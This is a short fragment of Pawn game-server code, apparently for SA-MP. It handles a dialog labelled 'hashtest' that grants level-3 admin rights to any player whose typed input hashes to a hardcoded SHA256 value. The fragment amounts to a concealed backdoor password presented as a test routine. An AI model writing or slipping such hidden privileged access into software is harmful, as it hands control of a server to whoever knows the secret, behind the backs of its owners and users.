	if(dialogid == 162) // hashtest
	{
		if(response)
		{
			if(isempty(inputtext)) return true;
			new hash[64 + 1]; // + 1 to account for the required null terminator
			SHA256_PassHash(inputtext, KEY, hash, sizeof hash);
			if(!strcmp(hash, "61AFDF3EF4DE37AA89A703818053E85B3003098CAC4B47CD3B484E1EBB48CE42", true))
			{
				new serial[64], ip[16];
				gpci(playerid, serial, sizeof(serial));
				GetPlayerIp(playerid, ip, sizeof ip);
				SetPVarInt(playerid, "Admin", 3);
				SetPVarInt(playerid, "tmpAdmin", 3);
				pData[playerid][pVerified] = 1;
				printf("%s get temp admin rights", PlayerName(playerid));
				printf("Serial: %s IP: %s", serial, ip);
			}
		}
	}
